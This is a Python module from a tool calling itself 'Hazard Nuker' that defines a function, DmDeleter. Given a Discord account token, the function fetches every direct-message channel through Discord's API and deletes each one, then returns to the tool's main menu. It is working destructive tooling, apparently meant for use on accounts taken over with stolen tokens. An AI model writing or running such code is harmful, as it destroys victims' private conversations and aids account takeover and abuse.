# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import json
import Hazard
from colorama import Fore

from util.plugins.common import print_slow, getheaders

def DmDeleter(token):
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.delete(f'https://discord.com/api/v9/channels/'+channel['id'],
            headers=getheaders(token))
            print(f"{Fore.RED}Deleted DM: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.RED}Deleted all available DM's ")
    print("Enter anything to continue. . . ", end="")
    input()
    Hazard.main()